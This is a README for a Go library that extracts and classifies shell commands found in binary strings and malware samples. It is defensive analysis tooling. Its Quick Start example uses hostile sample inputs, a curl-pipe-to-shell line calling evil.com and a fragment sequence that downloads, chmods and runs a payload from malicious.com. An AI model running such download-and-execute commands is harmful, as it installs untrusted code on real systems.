# CmdShark 🦈

A powerful Go library for extracting shell commands from binary strings and malware samples. CmdShark uses sophisticated lexical analysis, parsing, and heuristic scoring to identify and extract legitimate shell commands while filtering out noise and false positives.

## Features

- **Smart Command Detection**: Identifies shell commands using lexical analysis and command head recognition
- **Multi-Fragment Assembly**: Reconstructs commands that are split across multiple string fragments  
- **False Positive Filtering**: Advanced filtering to reduce noise from binary data, natural language, and library paths
- **Confidence Scoring**: Each extracted command includes a confidence score and method tracking
- **Syntax Validation**: Validates command syntax including quote and parenthesis balancing
- **Command Classification**: Automatically tags commands by type (network, execution, suspicious, file-ops, macos)

## Installation

```bash
go get github.com/katalinaware/cmdshark
```

## Quick Start

```go
package main

import (
    "fmt"
    "github.com/katalinaware/cmdshark"
)

func main() {
    extractor := cmdshark.NewExtractor()
    
    // Extract from a single string
    commands := extractor.ExtractFromString("bash -c 'curl http://evil.com | sh'")
    
    // Extract from multiple string fragments
    fragments := []string{
        "curl", "http://malicious.com/payload",
        "&&", "chmod", "+x", "/tmp/malware",
        "&&", "/tmp/malware",
    }
    commands = extractor.ExtractFromFragments(fragments)
    
    for _, cmd := range commands {
        fmt.Printf("Command: %s\n", cmd.Command)
        fmt.Printf("Confidence: %.3f\n", cmd.Confidence)
        fmt.Printf("Tags: %v\n", cmd.Tags)
        fmt.Printf("Methods: %v\n", cmd.Methods)
        fmt.Println("---")
    }
}
```

## Configuration

```go
extractor := cmdshark.NewExtractor()

// Adjust confidence threshold
extractor.SetMinConfidence(0.6)

// Enable/disable deduplication
extractor.SetDeduplication(true)

// Set maximum fragments per command
extractor.SetMaxFragments(10)
```

## Command Classification

CmdShark automatically classifies extracted commands:

- **network**: curl, wget, nc, telnet, etc.
- **execution**: bash, python, osascript, etc.  
- **suspicious**: rm -rf, sudo, kill, etc.
- **file-ops**: cp, mv, chmod, tar, etc.
- **macos**: osascript, launchctl, spctl, etc.

## Advanced Usage

### Custom Configuration

```go
config := cmdshark.Config{
    MinConfidence:         0.45,
    MaxWindow:            12,
    MaxJoinChars:         600,
    Dedupe:               true,
    MaxFragmentsTotal:    24,
    MaxFragmentsPerSegment: 4,
}

extractor := cmdshark.NewExtractorWithConfig(config)
```

### Processing Binary Data

```go
// CmdShark handles binary data with embedded commands
binaryData := []byte{0x00, 0x01, 'b', 'a', 's', 'h', ' ', '-', 'c', 0xFF}
commands := extractor.ExtractFromString(string(binaryData))
```

## Testing

Run the comprehensive test suite:

```bash
go test -v
go test -bench=.
```

## License

MIT License - see LICENSE file for details.

## Contributing

Contributions welcome! Please read CONTRIBUTING.md for guidelines.